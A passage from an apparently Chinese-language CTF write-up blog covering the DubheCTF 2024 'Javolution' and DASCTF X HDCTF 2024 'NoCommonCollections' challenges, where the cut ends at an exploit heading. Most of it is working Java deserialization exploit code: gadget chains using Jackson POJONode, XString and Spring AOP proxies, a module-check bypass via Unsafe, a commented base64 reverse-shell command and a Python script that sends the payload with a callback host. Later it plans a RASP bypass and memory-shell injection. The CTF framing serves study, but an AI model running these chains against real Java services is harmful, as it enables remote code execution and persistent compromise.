    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename)));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(ArrayList&lt;Class&gt; classes)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">getModuleMethod</span> <span class="hljs-operator">=</span> getMethod(Class.class, <span class="hljs-string">&quot;getModule&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span> (getModuleMethod != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">for</span> (Class aClass : classes) &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">targetModule</span> <span class="hljs-operator">=</span> getModuleMethod.invoke(aClass, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>                        unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>)), targetModule);<br>                    &#125;<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(Class clazz, String methodName, Class[] params)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">while</span> (clazz!=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                method = clazz.getDeclaredMethod(methodName,params);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">catch</span> (NoSuchMethodException e)&#123;<br>                clazz = clazz.getSuperclass();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923210118086.png" alt="image-20240923210118086"></p><p>官方：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.dubhe.javolution.pool.PalDataSource;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-comment">//String command = &quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br>        <span class="hljs-type">PalDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PalDataSource</span>();<br>        dataSource.setBROWSER(command);<br>        dataSource.setLOGMECH(<span class="hljs-string">&quot;BROWSER&quot;</span>);<br>        dataSource.setDSName(<span class="hljs-string">&quot;vps&quot;</span>);<br>        dataSource.setDbsPort(<span class="hljs-string">&quot;10250&quot;</span>);<br>        dataSource.setBROWSER_TIMEOUT(<span class="hljs-string">&quot;2&quot;</span>);<br>        dataSource.getConnection();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(dataSource, DataSource.class);<br><span class="hljs-comment">//        Object exp = getBadAttr(proxy);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br>        base64Serialize(exp);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBadAttr</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923204554413.png" alt="image-20240923204554413"></p><p>其实还可以打Eventlistenerlist的链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeReadObjectToStringTrigger</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>    <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>    <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) ReflectionHelper.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>    vector.add(obj);<br>    ReflectionHelper.setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure><p>一把梭：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;rO0ABXNyABFq......&quot;</span><br><br>baseUrl = <span class="hljs-string">&quot;xxxxxx&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">battle</span>(<span class="hljs-params">boss</span>):<br>    res = requests.get(baseUrl + <span class="hljs-string">f&quot;/pal/battle/<span class="hljs-subst">&#123;boss&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cheat</span>():<br>    res = requests.get(baseUrl + <span class="hljs-string">&quot;/pal/cheat?defense=-2147483648&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    res = requests.get(baseUrl + <span class="hljs-string">&quot;/pal/show&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseShell</span>():<br>    res = requests.post(baseUrl + <span class="hljs-string">&quot;/pal/cheat&quot;</span>, data=&#123;<span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;dubhe.sudo.cc&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>: payload&#125;)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cheat()<br>    show()<br>    battle(<span class="hljs-string">&quot;Jetragon&quot;</span>)<br>    show()<br>    reverseShell()<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923164051417.png" alt="image-20240923164051417"></p><p>参考：</p><p><a href="https://h4cking2thegate.github.io/posts/42795/#%E5%AE%8C%E6%95%B4exp">Javolution 出题小记 | H4cking to the Gate . (h4cking2thegate.github.io)</a></p><p><a href="https://pankas.top/2024/03/19/dubhectf%E5%9D%90%E7%89%A2%E8%AE%B0%E5%BD%95/#%E9%A2%98%E8%A7%A3">DubheCTF坐牢记录 (pankas.top)</a></p><p><a href="https://zer0peach.github.io/2024/03/18/Javolution/#%E9%87%8D%E5%A4%B4%E6%88%8F">Javolution - Zer0peach can’t think</a></p><p><a href="https://blog.s1um4i.com/2024-DubheCTF/">2024 XCTF 联赛 DubheCTF 部分题解 - S1uM4i</a></p><p><a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf (blackhat.com)</a></p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">luelueking&#x2F;Deserial_Sink_With_JDBC: Some ReadObject Sink With JDBC (github.com)</a></p><p>[DubheCTF 2024 Web Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2024/03/19/DubheCTF">https://boogipop.com/2024/03/19/DubheCTF</a> 2024 Web Writeup&#x2F;#Javolution)</p><h2 id="DASCTF-X-HDCTF-2024-NoCommonCollections"><a href="#DASCTF-X-HDCTF-2024-NoCommonCollections" class="headerlink" title="DASCTF X HDCTF 2024 - NoCommonCollections"></a>DASCTF X HDCTF 2024 - NoCommonCollections</h2><p>官方wp:<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq#xwxbK">DASCTF X HDCTF 2024 官方WP (yuque.com)</a></p><p>复现这道题主要是为了巩固JRMP和内存马。</p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>给了两个jar，一个题目逻辑，同时上了一个RASP通防。</p><p>借鉴了官网的wp，分析一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8081</span>;<br>    <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(port), <span class="hljs-number">0</span>);<br>    server.createContext(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>());<br>    server.setExecutor((Executor)<span class="hljs-literal">null</span>);<br>    server.start();<br>    System.out.println(<span class="hljs-string">&quot;Server is listening on port &quot;</span> + port);<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;<br>    MyHandler() &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange exchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">requestBody</span> <span class="hljs-operator">=</span> exchange.getRequestBody();<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><br>            <span class="hljs-type">int</span> nRead;<br>            <span class="hljs-keyword">while</span>((nRead = requestBody.read(data, <span class="hljs-number">0</span>, data.length)) != -<span class="hljs-number">1</span>) &#123;<br>                buffer.write(data, <span class="hljs-number">0</span>, nRead);<br>            &#125;<br><br>            buffer.flush();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base64Param</span> <span class="hljs-operator">=</span> buffer.toString();<br>            SerializeUtil.base64deserial(base64Param);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Data received successfully&quot;</span>;<br>            exchange.sendResponseHeaders(<span class="hljs-number">200</span>, (<span class="hljs-type">long</span>)response.length());<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> exchange.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Error&quot;</span>;<br>            exchange.sendResponseHeaders(<span class="hljs-number">200</span>, (<span class="hljs-type">long</span>)response.length());<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> exchange.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然的反序列化入口，只需要post传参数据它自己就会接收，显示结果。</p><p>它还重写了ObjectInputStream，看一看：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927185452840.png" alt="image-20240927185452840"></p><p>如题目所示，真是NoCommonsColletctions。</p><p>比较传统的一些过滤，题目只给了CC依赖没有给其他的东西，但是cc下的类又被黑名单过滤了，这种情况下由于没法触发getter，你不能使用<code>SignObject</code>二次反序列化，这里就该使用YsoSerial的JRMP服务去攻击了。</p><p>但是这一题还有个点位就是有个Rasp Hook了<code>Runtime</code>和<code>ProcessBuilder</code>方法：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927185744753.png" alt="image-20240927185744753"></p><p>因此这一题我们还需要反射调用native的<code>forandexec</code>方法去命令执行，并且需要自己实现一个<code>JRMPListner</code>。</p><h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><p>这里采用的是打入一个内存马：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 